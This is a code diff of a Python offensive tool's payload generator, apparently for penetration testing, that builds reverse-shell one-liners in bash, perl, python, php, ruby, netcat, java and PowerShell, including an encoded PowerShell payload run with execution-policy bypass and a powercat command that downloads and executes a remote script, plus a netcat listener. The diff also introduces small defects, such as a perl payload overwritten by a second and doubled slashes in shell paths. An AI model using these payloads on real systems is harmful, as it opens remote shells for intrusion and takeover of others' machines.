@@ -2,6 +2,7 @@
 
 import socket
 import os
+import re
 import sys
 import pty
 import util
@@ -365,42 +366,44 @@ class ParamikoTunnelHandler(SocketServer.BaseRequestHandler):
         self.request.close()
         self.log("Tunnel closed from %r" % (peername,))
 
-def generate_payload(type, local_address, port, index=None):
+def generate_payload(payload_type, local_address, port, index=None, **kwargs):
 
     commands = []
+    shell = kwargs.get("shell", "/bin/bash")
 
-    if type == "bash":
-        commands.append(f"bash -i >& /dev/tcp/{local_address}/{port} 0>&1")
-    elif type == "perl":
-        commands.append(f"perl -e 'use Socket;$i=\"{local_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'")
-        commands.append(f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{local_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
-    elif type == "python" or type == "python2" or type == "python3":
-        binary = type
-        commands.append(f"{binary} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'")
-    elif type == "php":
-        commands.append(f"php -r '$sock=fsockopen(\"{local_address}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'")
-    elif type == "ruby":
-        commands.append(f"ruby -rsocket -e'f=TCPSocket.open(\"{local_address}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'")
-    elif type == "netcat" or type == "nc":
-        commands.append(f"nc -e /bin/bash {local_address} {port}")
-        commands.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {local_address} {port} >/tmp/f")
-    elif type == "java":
-        commands.append(f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{local_address}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()")
-    elif type == "xterm":
-        commands.append(f"xterm -display {local_address}:1")
-    elif type == "powercat":
-        return "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\"" % (local_address, local_address, port)
-    elif type == "powershell":
+    if payload_type == "bash":
+        payload = f"bash -i >& /dev/tcp/{local_address}/{port} 0>&1"
+    elif payload_type == "perl":
+        payload = f"perl -e 'use Socket;$i=\"{local_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/{shell} -i\");}};'"
+        payload = f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{local_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+    elif re.match(r"python((2|3)(\.[0-9]+)?)?", payload_type):
+        payload = f"{payload_type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/{shell}\",\"-i\"]);'"
+    elif payload_type == "php":
+        payload = f"php -r '$sock=fsockopen(\"{local_address}\",{port});exec(\"/{shell} -i <&3 >&3 2>&3\");'"
+    elif payload_type == "ruby":
+        payload = f"ruby -rsocket -e'f=TCPSocket.open(\"{local_address}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'"
+    elif payload_type in ["netcat", "nc", "ncat"]:
+        method = kwargs.get("method", "fifo")
+        if method == "fifo":
+            payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|{payload_type} {local_address} {port} >/tmp/f"    
+        else:
+            payload = f"{payload_type} {local_address} {port} -e {shell}"
+    elif payload_type == "java":
+        payload = f"r = Runtime.getRuntime()\np = r.exec([\"{shell}\",\"-c\",\"exec 5<>/dev/tcp/{local_address}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
+    elif payload_type == "xterm":
+        payload = f"xterm -display {local_address}:1"
+    elif payload_type == "powercat":
+        shell = kwargs.get("shell", "cmd")
+        return f"powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{local_address}/powercat.ps1');powercat -c {local_address} -p {port} -e {shell}\""
+    elif payload_type == "powershell":
         payload = '$a=New-Object System.Net.Sockets.TCPClient("%s",%d);$d=$a.GetStream();[byte[]]$k=0..65535|%%{0};while(($i=$d.Read($k,0,$k.Length)) -ne 0){;$o=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($k,0,$i);$q=(iex $o 2>&1|Out-String);$c=$q+"$ ";$b=([text.encoding]::ASCII).GetBytes($c);$d.Write($b,0,$b.Length);$d.Flush()};$a.Close();' % (local_address, port)
         payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
-        return f"powershell.exe -exec bypass -enc {payload_encoded}"
+        payload = f"powershell.exe -exec bypass -enc {payload_encoded}"
     else:
-        return None
+        payload = None
+        print("[-] Unknown payload type:", payload_type)
 
-    if index is None or index < 0 or index >= len(commands):
-        return "\n".join(commands)
-    else:
-        return commands[index]
+    return payload
 
 def spawn_listener(port):
     pty.spawn(["nc", "-lvvp", str(port)])
